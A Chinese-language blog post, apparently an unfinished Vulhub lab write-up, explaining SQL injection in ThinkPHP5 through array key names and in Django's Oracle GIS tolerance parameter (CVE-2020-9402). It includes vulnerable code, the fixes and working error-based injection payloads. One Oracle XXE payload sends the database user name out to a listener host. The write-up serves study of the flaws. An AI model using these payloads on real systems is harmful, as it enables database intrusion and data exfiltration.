---
layout: post
title:  "【Vulhub】SQL注入"
date:   2023-06-17 00:00:00 +0800
categories: 安全
tags: Vulhub 安全
comments: 1
mathjax: true
copyrights: 原创
---

本文讨论各类 SQL 注入。别急，还没写完……

# ThinkPHP5 SQL 注入漏洞

Vulhub 漏洞地址 https://vulhub.org/#/environments/django/CVE-2020-9402/。

包含漏洞的代码：

```php
<?php
namespace app\index\controller;
use app\index\model\User;
class Index
{
    public function index()
    {
        // 将 ids 作为一个数组传给 $ids
        $ids = input('ids/a');
        $t = new User();
        $result = $t->where('id', 'in', $ids)->select();
    }
}
```

正常情况下，我们会传参 `?ids[]=1&ids[]=2`。

在上述代码中，`IN` 操作代码如下：

```php
<?php
...
// 如果 $bindName 为空，则用 'where_' 替代
$bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
// 如果 $bindName 中有非单词字符，则用 MD5 替代
if (preg_match('/\W/', $bindName)) {
    $bindName = md5($bindName);
}
...
} elseif (in_array($exp, ['NOT IN', 'IN'])) {
    // 处理 IN 查询
    // 如果 $value 为匿名函数，则将键名 $key、操作符 $exp 和匿名函数 $value 拼接到 $whereStr 中
    if ($value instanceof \Closure) {
        $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
    } else {
        // 如果 $value 不是数组，则按照逗号拆分，使之变为一个数组
        $value = is_array($value) ? $value : explode(',', $value);
        // 如果 $field 在 $bind 中
        if (array_key_exists($field, $binds)) {
            $bind  = [];
            $array = [];
            // 遍历 $value
            foreach ($value as $k => $v) {
                // 如果已经绑定键名 $bindName，则添加唯一标识符
                if ($this->query->isBind($bindName . '_in_' . $k)) {
                    $bindKey = $bindName . '_in_' . uniqid() . '_' . $k;
                } else {
                    $bindKey = $bindName . '_in_' . $k;
                }
                // 将绑定的结果放入 $bind 中
                $bind[$bindKey] = [$v, $bindType];
                $array[]        = ':' . $bindKey;
            }
            $this->query->bind($bind);
            // 使用逗号连接 $array
            $zone = implode(',', $array);
        } else {
            $zone = implode(',', $this->parseValue($value, $field));
        }
        $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')';
    }
```

可以看到，`$k` 是由用户控制的，且它会被拼接到查询的键名 `$bindName` 后面。因此，攻击者可以通过数组 `ids` 的键名来实施注入。当传入 `?ids[]=1&ids[']=2` 时会报错，因此存在报错注入 `?ids[0,updatexml(0,concat(0xa,user()),0)]=1`。

但这个攻击是有局限性的——你可以使用报错注入获得 `user()` 的结果，但你无法真正使用语句查询数据库里的值。

这是因为 PDO 有预处理机制。预处理机制有三步：

- `prepare($SQL)` 编译SQL语句
- `bindValue($param, $value)` 将value绑定到param的位置上
- `execute()`

例如：

```php
<?php
$stmt = $dbh->prepare("INSERT INTO REGISTRY (name, value) VALUES (:name, :value)");
$stmt->bindParam(':name', $name);
$stmt->bindParam(':value', $value);
// 插入一行
$name = 'one';
$value = 1;
$stmt->execute();
// 插入另一行
$name = 'two';
$value = 2;
$stmt->execute();
```

ThinkPHP 默认会启用 `PDO::ATTR_EMULATE_PREPARES  => false`，也就是非模拟预处理。在此情况下，内部不会模拟参数绑定的过程，而是直接与 Mysql 交互。如果在预处理机制的第一步就报错，就不会继续后续操作。但毕竟是预编译，哪怕与数据库进行交互，也无法直接获取到具体的数据。

# Django GIS SQL 注入漏洞 (CVE-2020-9402)

Vulhub 漏洞地址 https://github.com/vulhub/vulhub/tree/master/django/CVE-2020-9402

首先要说的是这个环境超级难搭。Oracle 数据库+Django 需要 9G 的磁盘空间，而且数据库启动需要不少时间，于是 django 抽风不停重启，要等好久才能正常。

## 漏洞1

漏洞利用的是 GIS（地理信息查询系统），有漏洞的代码如下：

```python
def vuln(request):
    query = request.GET.get('q', default=0.05)
    qs = Collection.objects.annotate(
        d=Distance(
            Point(0.01, 0.01, srid=4326),
            Point(0.01, 0.01, srid=4326),
            tolerance=query,
        ),
    ).filter(d=D(m=1)).values('name')
    return HttpResponse(qs)
```

在 Oracle 中，tolerance（容差）是指在执行搜索操作时，用于确定匹配结果的模糊度或接受程度的设置。它用于控制查询的灵活性，以便能够返回与指定条件相似但不完全匹配的结果。tolerance 可以应用于不同的搜索操作，例如文本搜索、地理位置搜索等。它允许你指定查询条件与目标数据之间的差异范围，并确定允许的模糊匹配程度。

上述代码对应的查询语句为：

```sql
SELECT "APP_NAMEDMODEL"."NAME" FROM "APP_INTERSTATE" INNER JOIN "APP_NAMEDMODEL" ON ("APP_INTERSTATE"."NAMEDMODEL_PTR_ID" = "APP_NAMEDMODEL"."ID") WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (0.01, 0.01),4326), SDO_GEOMETRY(POINT (0.01, 0.01),4326), 0.05) =  1.0 FETCH FIRST 21 ROWS ONLY;
```

查看 https://github.com/django/django/blob/335c9c94acf263901fb023404408880245b0c4b4/django/contrib/gis/db/models/functions.py，可以看到，`as_oracle` 函数为：

```python
def as_oracle(self, compiler, connection, **extra_context):
    tol = self.extra.get('tolerance', self.tolerance)
    return self.as_sql(
        compiler, connection,
        template="%%(function)s(%%(expressions)s, %s)" % tol,
        **extra_context
    )
```

`tolerance` 从 `self.extra.get` 导入，该方法会搜索全局变量的值，如果该值不存在，则直接设置为 0.05，并且将其直接传入到新的变量中。之后则不对 tol 进行任何处理直接拼接到 template 字符串中并且传入 `as_sql` 方法。那么官方对于 `as_sql` 的文档是，此方法需要一个SQLCompiler对象，位于`django/db/models/sql/compiler.py`文件中。而我们只需要知道在该对象中有一个`compile()`方法，该方法可以返回一个包含 SQL 字符串的元祖，而 SQLComiler 对象中的 query 变量则是存储直接进行 SQL 查询语句的 SQL 命令。从而两个 Point 分别进入`compile`方法中进行拼接。

我们可以用此方法报错注入，找到数据库版本号：`?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null OR (1%2B1`，那么查询就变成了：

```sql
SELECT "APP_NAMEDMODEL"."NAME" FROM "APP_INTERSTATE" INNER JOIN "APP_NAMEDMODEL" ON ("APP_INTERSTATE"."NAMEDMODEL_PTR_ID" = "APP_NAMEDMODEL"."ID") WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (0.01, 0.01),4326), SDO_GEOMETRY(POINT (0.01, 0.01),4326), 20) = 1 OR (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null OR (1+1) = 1.0 FETCH FIRST 21 ROWS ONLY;
```

该注入的修复也很简单，直接判断 `tolerance` 是否为数字即可：

```python
tolerance = Value(self._handle_param(
    self.extra.get('tolerance', self.tolerance),
    'tolerance',
    NUMERIC_TYPES,
))
```

## 漏洞2

另一段有漏洞的函数为：

```python
def vuln2(request):
    query = request.GET.get('q', default=0.05)
    qs = Collection2.objects.aggregate(
            Union('point', tolerance=query),
    ).values()

    return HttpResponse(qs)
```

这边的 SQL 查询语句为：

```sql
SELECT SDO_UTIL.TO_WKBGEOMETRY(SDO_AGGR_UNION(SDOAGGRTYPE("APP_CITY"."POINT", 0.05))) AS "POINT__UNION" FROM "APP_CITY";
```

查看 https://github.com/django/django/blob/335c9c94acf263901fb023404408880245b0c4b4/django/contrib/gis/db/models/aggregates.py，可以看到有：

```python
def as_oracle(self, compiler, connection, **extra_context):
    tolerance = self.extra.get('tolerance') or getattr(self, 'tolerance', 0.05)
    template = None if self.is_extent else '%(function)s(SDOAGGRTYPE(%(expressions)s,%(tolerance)s))'
    return self.as_sql(compiler, connection, template=template, tolerance=tolerance, **extra_context)
```

这里，`tolerance` 同样没有检查就用于 SQL 查询。

同样的，我们可以使用报错注入：`?q=20))) FROM "VULN_COLLECTION2" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --`，那么查询就变成了：

```sql
SELECT SDO_UTIL.TO_WKBGEOMETRY(SDO_AGGR_UNION(SDOAGGRTYPE("APP_CITY"."POINT", 20))) FROM "VULN_COLLECTION2" where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --))) AS "POINT__UNION" FROM "APP_CITY";
```

由此得到了数据库用户名。

考虑到 oracle 的版本，漏洞 1（漏洞 2 类似）还可以利用 Oracle XXE 漏洞（CVE-2014-6577） 注入构造的恶意 xml：`?q=20) = 1 OR (select extractvalue(xmltype('%3C%3Fxml version%3D%221.0%22 encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE root %5B %3C!ENTITY %25%25%25%25 remote SYSTEM %22http%3A%2F%2Fhost.docker.internal%3A9000%2F'%7C%7C(SELECT  utl_inaddr.get_host_name() from dual)%7C%7C'%22%3E %25%25%25%25remote%3B%5D%3E')%2C'%2Fl') from dual) is not null OR (1%2B1`。

在 shell 中监听得到：

```shell
$ nc -l 9000
GET /SYSTEM HTTP/1.0
Host: host.docker.internal
Content-Type: text/plain; charset=utf-8
```

可以看到，返回了数据库用户名。

# 参考

- https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html
- https://blog.csdn.net/Fly_hps/article/details/84953248
- https://www.djangoproject.com/weblog/2020/mar/04/security-releases/
- https://xz.aliyun.com/t/7403
